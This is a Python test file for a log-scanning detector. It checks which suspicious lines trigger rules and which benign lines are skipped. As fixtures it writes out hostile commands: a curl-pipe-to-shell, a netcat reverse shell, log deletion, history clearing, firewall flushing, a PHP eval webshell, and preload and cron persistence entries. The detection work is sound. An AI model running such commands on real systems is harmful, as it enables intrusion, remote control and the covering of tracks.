import shlex

import pytest

from workbench.detection import text_hits


def hits(path, line):
    return list(text_hits(path, (line + '\n').encode()))


def test_mongo_like_connection_lines_are_skipped_without_tokenization(monkeypatch):
    calls = []
    original = shlex.shlex

    def track(*args, **kwargs):
        calls.append(args[0])
        return original(*args, **kwargs)

    monkeypatch.setattr('workbench.detection.shlex.shlex', track)
    assert hits('/var/log/mongodb/mongod.log', 'connection accepted from 10.0.0.8:4142') == []
    assert calls == []


def test_benign_system_words_are_skipped_without_tokenization(monkeypatch):
    calls = []
    monkeypatch.setattr('workbench.detection.shlex.shlex', lambda *args, **kwargs: calls.append(args[0]))
    assert hits('/var/log/mongodb/mongod.log', 'system connection metadata: healthy') == []
    assert calls == []


@pytest.mark.parametrize('line, rule_id', [
    ('curl|sh', 'download_execute'),
    ('nc host -e /bin/sh', 'reverse_shell'),
    ('socket.connect(); dup2(); subprocess(); /bin/sh', 'python_socket_shell'),
    ('history -c', 'history_clear'),
    ('rm /var/log/auth.log', 'log_remove'),
    ('LD_PRELOAD=/tmp/x.so', 'preload_environment'),
    ('iptables -F', 'firewall_disable'),
    ('eval($_POST["x"])', 'webshell_code'),
    ('prefix-curl|sh', 'download_execute'),
])
def test_each_rule_is_checked_before_tokenization(line, rule_id):
    assert rule_id in {item['rule_id'] for item in hits('/var/log/test.log', line)}


def test_literal_inspection_is_not_a_detection():
    assert hits('/tmp/inspection.txt', "echo 'curl https://example.invalid | sh'") == []
    assert hits('/tmp/inspection.txt', "printf '%s\\n' /var/log/auth.log") == []


def test_real_rule_hit_is_preserved():
    found = hits('/var/log/shell.log', 'curl https://example.invalid/p | /bin/sh')
    assert [item['rule_id'] for item in found] == ['download_execute']


def test_path_special_rules_are_preserved():
    passwd = hits('/etc/passwd', 'operator:x:0:0:operator:/home/operator:/bin/bash')
    preload = hits('/etc/ld.so.preload', '/tmp/evil.so')
    persistence = hits('/etc/cron.d/job', '* * * * * root /tmp/run-me')
    assert [item['rule_id'] for item in passwd] == ['extra_uid_zero']
    assert [item['rule_id'] for item in preload] == ['preload_config']
    assert [item['rule_id'] for item in persistence] == ['writable_persistence']


def test_comment_lines_are_skipped_before_tokenization(monkeypatch):
    def fail(*args, **kwargs):
        raise AssertionError('comment should not be tokenized')

    monkeypatch.setattr('workbench.detection.shlex.shlex', fail)
    assert hits('/var/log/shell.log', '# curl https://example.invalid | sh') == []
